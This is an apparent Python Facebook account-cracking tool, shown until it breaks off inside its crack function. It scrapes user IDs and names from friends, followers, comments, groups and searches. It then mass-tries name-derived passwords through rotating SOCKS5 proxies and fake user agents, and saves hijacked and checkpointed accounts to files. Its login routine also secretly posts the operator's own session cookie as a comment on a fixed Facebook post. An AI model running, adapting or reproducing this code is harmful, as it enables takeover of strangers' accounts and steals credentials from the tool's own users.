#!/usr/bin/python3
# -*- coding: utf-8 -*-
###---[ INFO AUTHOR GANS DIKIT ]---###
#----[ jangan di oprek, sayangi data hpmu ]-----#
author = 'FilterXyz'
git_hub = 'github.com/FilterXyz'
whatsapp = '+19725344955'
version = 'FilterXyz '
'''Give Away By Mr Qureshi <3 '''

###---[ WARNA ]--###
P = '\033[97m'  # PUTIH
M = '\033[91m' # MERAH
hh = '\033[92m'  # HIJAU
kk = '\033[93m'  # KUNING


###---[ IMPORT MODULE ]---###
import re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')


###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f""" 
                      {kk}TOOLS PERTAMAX{kk}
     {hh}╭━━━┳━━━┳━━━┳━━━━┳━━━┳━╮╭━       ┳━━━┳━╮╭━╮
     ┃╭━╮┃╭━━┫╭━╮┃╭╮╭╮┃╭━╮┃┃╰╯┃     ┃╭━╮┣╮╰╯╭╯
     ┃╰━╯┃╰━━┫╰━╯┣╯┃┃╰┫┃╱┃┃╭╮╭╮     ┃┃╱┃┃╰╮╭╯
     ┃╭━━┫╭━━┫╭╮╭╯╱┃┃╱┃╰━╯┃┃┃┃┃     ┃╰━╯┃╭╯╰╮
     ┃┃╱╱┃╰━━┫┃┃╰╮╱┃┃╱┃╭━╮┃┃┃┃┃   ┃╭━╮┣╯╭╮╰╮
     ╰╯╱╱╰━━━┻╯╰━╯╱╰╯╱╰╯╱╰┻╯╰╯╰     ┻╯╱╰┻━╯╰━╯ {hh}
                     {P}AUTHOR{P} : {kk}FilterXyz{kk}""")
def logo2():
	return str(f""" 
                       {hh}TOOLS PERTAMAX{M}
       
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝   
                       {P}AUTHOR{P}: {kk}FiterXyz{kk}""")

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'


###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, pro, redmi = [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	

###---[ DUMP PROXY ]---###
try:
	uadev = ses.get("https://raw.githubusercontent.com/RozhBasXYZ/REMOVE/main/info.txt").text
	if 'useragent' in uadev:pass
	else:clear_layar();exit()
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	for x in uno.splitlines():pro.append(x)
except requests.exceptions.ConnectionError:
	sys.exit(f" [{M}!{P}] tidak ada koneksi internet")


###----[ DUMP USER AGENT ]----###
def ua_rozh():
	rr = random.randint
	rc = random.choice
	A = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Redmi Note {str(rr(3,9))} Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(10,100))}.0.3987.149" #ANDROID UCB
	B = f"Mozilla/5.0 (Android {str(rr(2,10))}; E2303 Build/26.3.A.0.131) AppleWebKit/537.36 (KHTML, like Gecko) YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36" #ANDROID
	C = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Redmi Note {str(rr(3,9))} Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.4865.0 YaBrowser/21.9.0.359.00 SA/3 Mobile Safari/537.36" #ANDRID YANDX
	D = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Nokia_XL; Flow) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.0.4044.138 Mobile Safari/537.36 OPR/{str(rr(11,99))}.2.2878.53403"
	E = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; GT-I9060M) AppleWebKit/537.36 (KHTML, like Gecko) Opera Mini/{str(rr(2,20))}.0.35626/191.273" #ANDROID ORERA MINI
	F =  f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3pre) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.889.00 Opera/537.36" #WINDOWS OPERA
	baz = rc([A,B,C,D,F])
	tz = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Nokia_XL; Flow) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.0.303 Mobile Safari/537.36"
	return tz	

###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	no = 0
	nom = []
	clear_layar()
	print(logo2())
	cookie = input(f"\n[{hh}•{P}] LOGIN COOKIE                                            [{hh}•{P}] KETIK '{kk}GET{P}' UNTUK COOKIE GRATIS!\n[{hh}•{P}] Masukan Cookie : ")
	if cookie in ['get','Get','GET']:
		data = parser(ses.get("https://www.facebook.com/100032386028880/posts/674525870303608").content, "html.parser")
		for x in re.findall('"text":"(.*?)"',str(data)):
			if 'datr=' in x:
				no+=1
				nom.append(x)
				print(f' [{hh}{no}{P}]. {x}\n')
				time.sleep(0.9)
		abc = input(" nomor : ")
		cookie = nom[int(abc)-1]
		print(f' {hh}{cookie}{P}')
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		back()
	except Exception as e:exit(f"[{M}!{P}] cookie invalid")



###---[ REMOVE TOKEN & COOKIE ]---###
def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
	
	
	
###---[ MENU UTAMS ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	
	print('[•] MENU CRACK PERTAMAX')
	print('                               ')
	print(f"[{hh}01{P}] Crack Publik       [{hh}07{P}] Crack Search                                  ")
	print(f"[{hh}02{P}] Crack Massal       [{hh}08{P}] Crack Dari File                               ")
	print(f"[{hh}03{P}] Crack Follower     [{hh}09{P}] Cek Hasil Akun                                ")
	print(f"[{hh}04{P}] Crack Komen        [{hh}10{P}] Cek Akun Checkpoint                                ")
	print(f"[{hh}05{P}] Crack Group        [{hh}11{P}] Cek Opsi Akun                                 ")
	print(f"[{hh}06{P}] Crack Email        [{hh}0{P}] Keluar ({M}Log Out{P})                               ")

	ask = input(f'[{hh}•{P}] Pilih Menu : ')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_search()
	elif ask in ['8','08']:crack_file()
	elif ask in ['9','09']:cek_hasil()
	elif ask in ['10']:cek_akun()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['0']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f"[{M}!{P}] isi yang benar anjing")
	else:sys.exit(f"[{M}!{P}] isi yang benar anjing")


	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	try:ok = os.listdir('CP')
	except:sys.exit(f" [{M}•{P}] tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f'[{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')	
	exc = input(f'[{kk}•{P}] nomor yang akan di cek\n nomor : ')
	file = nom[int(exc)-1]
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = ua_rozh()
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r[{hh}•{P}] cek opsi checkpoint telah selesai')
	


###---[ CEK AKUN AMAN ]---###
def cek_akun():
	sesi , nga = 0 , 0
	no,nom = 0,[]
	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}
	except:print(f'[{M}!{P}] cookie invalid');exit()
	try:ok = os.listdir('OK')
	except:sys.exit(f"[{M}!{P}] tidak ada hasil ok")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f'[{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
	exc = input(f'[{hh}•{P}] Nama File Yang Akan Di Cek\nFile : ')
	xxx = input('Simpan Akun Tidak Kenon Ke File Apa?\nNama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	
	print(f'Akun Tidak Kenon Di : {nonon}\nAkun Yang Kenon Di  : Di Simpan')
	
	try:
		uuid = open('OK/'+file,'r').read().splitlines()
		mek = 0
		for data in uuid:
			print(f'\r[{hh}•{P}] aman : {nga} down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f"[{M}•{P}] pemisah salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r [{hh}{mek}{P}] {user}|{nama}     {hh}{na}{P}   ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r[{M}{mek}{P}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f"[{M}!{P}] file tidak ada")
		
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f'[{hh}1{P}] cek hasil akun ok\n[{hh}2{P}] cek hasil akun cp\nPilih Menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}!{P}] tidak ada hasil ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f'[{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f'[{hh}•{P}] nama file : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f"[{M}!{P}] file tidak ada hasil ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f"[{M}!{P}] tidak ada hasil cp")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f'[{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
		abc = input(f' [{hh}•{P}] nama file : ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f"[{M}!{P}] file tidak ada hasil cp")
		print(kk+buka+P)
	else:sys.exit(f"[{M}!{P}] isi yang benar kontol")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f'[{hh}!{P}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f'[{M}•{P}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		print('\r sedang dump %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()
		

def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f'Dump Dari Email, Max 10000 ID')
	nama = input(' Target : ')
	if ',' in str(nama):
		exit(f' masukan 1 nama saja')
	doma = input(' Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' Masukin Domain Yang Benar kontol')
	jumlah = input(' Total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==10000:atur_atur()
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f'[{hh}•{P}] masukan nama file dump\n file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f"[{M}!{P}] pemisah salah")
			dump.append(data)
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f"[{M}!{P}] file tidak ada")
	print(f'\r[{hh}•{P}] total jumlah akun adalah {len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f'[{hh}•{P}] 1 nama setara dengan 10k akun')
	nam = input(f' nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string=' Lihat Hasil Selanjutnya').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f'[{hh}<{P}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f'[{M}!{P}] gagal dump komen')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
	
###---[ DUMP LOGIN ]---###
def crack_publik(t,c):
	akun = input(f'[{hh}!{P}] pastikan akun bersifat publik \n id akun : ')
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
	except Exception as e:
		print(e)
		exit(f"[{M}!{P}] akun tidak publik")
	atur_atur()


def crack_masal(t,c):
    print(f'[{hh}!{P}] Pastikan Target Bersifat Publik ')
    try:
        bz=0
        apa = int(input(f'[{hh}•{P}] Jumlah Target : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r[{hh}•{P}] Masukan Id Yang Ke{bz} : ')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r[{kk}!{P}] akun tidak publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f'[{hh}!{P}] pastikan akun bersifat publik \n id akun : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"[{M}!{P}] akun tidak publik")
		
def crack_group():
	link = input(f' [{hh}•{P}] pastikan group bersifat publik \n id group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f'[{M}!{P}] gagal dump group')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(f"\r{hh}[•]{hh} PILIH METODE")
	print(f"\r{P}     ")
	ro = input(f'[{hh}1{P}]. Mobile \n[{hh}2{P}]. Mbasic \n[{hh}3{P}]. Free\n[{hh}•{P}]. Pilih Metode : ') 
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	elif ro in ['3','03']:metode.append('free')
	else:metode.append('mobile')
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	ch = input(f'[{hh}1{P}]. Akun Old \n[{hh}2{P}]. Akun Old \n[{hh}3{P}]. Akun Random\n[{hh}•{P}]. Metode Akun : ')
	if ch in ['1','01']:
		for x in dump:
			id.append(x)
	elif ch in ['2','02']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	cp = input(f'[{hh}•{P}] Tampilkan Opsi CP [Y/n]\n╠───[{hh}•{P}]. Pilih : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	apk = input(f'[{hh}•{P}] Tampilkan Info Aplikasi [Y/n]\n[{hh}•{P}]. Pilih : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	ch = input(f'[{hh}1{P}]. Password Manual \n[{hh}2{P}]. Password Gabung \n╠───[{hh}3{P}]. Password default\n[{hh}•{P}]. Pilih : ')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	B = input(f' [{hh}!{P}] input sandi manual 6 kata\n sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	print(f'Filter OK Disimpan Di : {sim_ok}\nFilter CP Disimpan Di : {sim_cp}')
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r[{hh}•{P}] Crack Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	B = input(f'[{hh}•{P}] input sandi manual 6 kata\n masukan sandi : ').split(',')
	C = input(f'[{hh}•{P}] input sandi belakang nama\n masukan sandi : ')
	if ',' in str(C):
		exit(f" [{M}!{P}] sandi belakang satu kata saja")
	print(f"\r{P}─────────────────────────────────────────────────────────────")
	print(f'Filter OK Disimpan Di : {sim_ok}\nFilter CP Disimpan Di : {sim_cp}')
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r[{hh}•{P}] Crack Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	print(f'Filter OK Disimpan Di : {sim_ok}\nFilter CP Disimpan Di : {sim_cp}')
	print(f"\r{P}────────────────────────────────────────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['123456']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r[{hh}•{P}] Crack Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')
				

###---[ MENU CRACK ]---###
resok = []
rescp = []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	proxy = {'http': 'socks5://'+random.choice(pro)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}♥{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			ua = random.choice(['Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
